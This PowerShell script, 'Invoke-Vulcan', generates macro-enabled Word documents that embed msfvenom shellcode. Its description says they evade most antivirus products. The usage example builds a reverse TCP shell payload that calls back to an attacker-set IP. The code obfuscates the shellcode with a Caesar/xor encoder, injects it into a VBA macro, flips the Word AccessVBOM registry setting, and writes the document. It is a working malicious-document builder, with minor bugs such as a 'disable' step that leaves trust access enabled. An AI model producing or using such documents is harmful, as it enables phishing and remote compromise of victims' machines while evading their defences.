function Invoke-Vulcan {
    <#
    .SYNOPSIS
        Streamlines the process of creating macro-enabled Word documents.

        Author: Alexandre Teyar (@aress31)
        License: BSD 3-Clause
        Required Dependencies: Windows Subsystem for Linux (WSL), BadAssMacros
        Optional Dependencies: None

    .DESCRIPTION
        Using MSFVenom creates a macro-enabled Word document that - at the time
        of writing - evade most AVs, including Windows Defender.

    .PARAMETER Shift
        Specifies the Caesar shift value to use with the xor decoder.

    .PARAMETER Decoder
        Specifies the type of decoder to use, e.g., xor.

    .PARAMETER Decoder
        Path to the Visual Basic decoding function.

    .PARAMETER OutputDirectory
        Folder to output files too.
    
    .PARAMETER OutputPrefix
        Prefix to add to output files.

    .PARAMETER ShellCode
        Specifies the (hex-encoded) shellcode to use.

    .PARAMETER Template
        Path to the Visual Basic template to use.

    .PARAMETER Treshold
        Specifies the threshold to use before breaking the shellcode array lines.
  
    .EXAMPLE
        PS C:\>  wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.Visual Basic -Shift 5

        Executes MSFVenom with the specified payload and options, pass the generated hex-formatted shellcode to BadAssMacros to obfuscate it in order to evade AVs,
        and then removes creates an empty macro-enabled Word document containing the processed macro.
    #>

    [CmdletBinding(PositionalBinding = $False)]
    param(
        [ValidateSet("caesar")]
        [string]
        $Decoder,

        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
        [String]
        $DecoderPath,

        [ValidateRange(-25, 25)]
        [int]
        $Shift,

        [ValidateScript({ Test-Path -Path $_ -PathType Container })]
        [String]
        $OutputDirectory = $(Get-Location),

        [String]
        $OutputPrefix = "vulcan",

        [Parameter(Mandatory, ParameterSetName = 'B', ValueFromPipeline)]
        [string]
        $ShellCode,

        [Parameter(Mandatory)]
        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
        [String]
        $Template,
        
        [int]
        $Treshold = 72
    )

    $MacroOutput = New-TemporaryFile
    Resolve-Path `
        -Path $(Join-Path -Path $OutputDirectory "${OutputPrefix}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).doc") `
        -ErrorAction SilentlyContinue -ErrorVariable _frperror
    $WordOutput = $_frperror[0].TargetObject

    Write-Output "[+] Enabling trust access to Visual Basic Project Object Model in Microsoft Word..."
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1

    Write-Verbose "Loading (hex-formatted) shellcode..."
    Create_MacroFromTemplate -Shift $Shift -Decoder $Decoder -DecoderPath $DecoderPath -ShellCode $ShellCode -Template $Template -Treshold $Treshold
    Create_WordDocument -MacroOutput $MacroOutput -Output $WordOutput

    Write-Output "[-] Removing (Visual Basic) macro file..."
    Remove-Item -Path $MacroOutput -Force
        
    Write-Output "[+] Disabling trust access to Visual Basic Project Object Model in Microsoft Word..."
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
}

function Format-HexArray($HexArray, $Treshold) {
    foreach ($x in $HexArray) {
        $x = $x.ToUpper()

        if ($i -eq $Treshold) {
            $Payload += "Chr(&H${x}), _`r`n"
            $i = 0
        } 
        else {
            $Payload += "Chr(&H${x}),"
            $i += 1
        }
    }

    $ForbiddenChars = @{
        "00" = "0"
        "01" = "1"
        "02" = "2"
        "03" = "3"
        "04" = "4"
        "05" = "5"
        "06" = "6"
        "07" = "7"
        "08" = "8"
        "09" = "9"
        "0A" = "A"
        "0B" = "B"
        "0C" = "C"
        "0D" = "D"
        "0E" = "E"
        "0F" = "F"
    }

    foreach ($x in $ForbiddenChars.GetEnumerator()) {
        $Payload = $Payload.Replace($x.Name, $x.Value)
    }

    return $Payload
}

function Convert-HexToHexArray($ShellCode, $Treshold) {
    $HexArray = $ShellCode -Split '(.{2})' -ne '' 
    $Payload = Format-HexArray -HexArray $HexArray -Treshold $Treshold

    return $Payload.Substring(0, $Payload.Length - 1) 
}

function Create_MacroFromTemplate($Shift, $Decoder, $DecoderPath, $ShellCode, $Template, $Treshold) {
    Write-Verbose "Creating (Visual Basic) macro..."
    $PayloadArray = Convert-HexToHexArray -ShellCode $ShellCode -Treshold $Treshold
    Write-Debug "Create_MacroFromTemplate->`$PayloadArray: $PayloadArray"

    switch ($Decoder) {
        "caesar" {
            Set-Content -Path $MacroOutput -Value (
                Get-Content -Path $Template).Replace("PAYLOAD", "Array(" + $PayloadArray + ')' + "`r`n" + "`r`n" + "`t" + "kUG(HoR)")
            Add-Content -Path $MacroOutput -Value ((Get-Content -Path $DecoderPath).Replace("Shift", $Shift))
        }
        Default {
            Set-Content -Path $MacroOutput -Value (
                (Get-Content -Path $Template).Replace("PAYLOAD", "Array(" + $PayloadArray + ')'))
        }
    }

    Write-Output "[+] (Visual Basic) macro written to: $MacroOutput"
}

function Create_WordDocument($MacroOutput, $Output) {
    Write-Verbose "Creating (macro-enabled) Word document..."
    $Word = New-Object -ComObject Word.Application
    $Doc = $Word.Documents.Add()

    $DocModule = $Doc.VBProject.VBComponents.Add(1)
    $DocModule.CodeModule.AddFromFile($MacroOutput)

    Write-Output "[+] Word document written to: $Output" 
    $Doc.SaveAs($Output, 0)

    $Doc.Close()
    $Word.Quit()
}